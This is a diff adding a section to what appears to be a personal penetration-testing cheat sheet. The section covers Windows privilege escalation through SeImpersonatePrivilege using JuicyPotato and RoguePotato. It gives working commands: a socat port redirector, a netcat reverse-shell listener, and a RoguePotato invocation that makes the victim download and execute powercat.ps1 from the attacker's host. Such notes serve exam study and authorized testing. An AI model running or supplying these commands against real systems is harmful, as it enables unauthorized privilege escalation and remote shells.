@@ -457,6 +457,23 @@ LPVOID lpReserved ) // Reserved
 
 [Back to top](#index)
 
+### *SeImpersonatePrivilege*
+
+If we find ourseleves having compromised an user with this privilege enabled, there are various ways to escalate privileges.
+1. Use JuicyPotato.exe if the OS version is prior to Windows 10 (1809)
+2. Use RoguePotato.exe if OS versions is higher than Wndows 10 (1809) (there are more options as PrintSpoofer) [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
+
+To use RoguePotato, once it is transferred to the vulnerable machine:
+
+On Kali:
+1. Forward the incoming traffic to the port specified in *-l* flag of RoguePotato `socat tcp-listen:135,reuseaddr,fork tcp:<vulnerable_machine_ip>:9999`
+2. Setuo a listener to receive the powercat reverse connection `nc -lvp <desired_port_to_receive_reverse_connection>`
+
+On vulnerable host:
+1. Execute RoguePotato: `.\RoguePotato.exe -r <kali_machine_ip> -e "powershell -c iex (new-object net.webclient).downloadstring('http://<kali_machine_ip>:8000/powercat.ps1')" -l 9999`
+
+[Back to top](#index)
+
 ## Port Scanning
 
 This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)
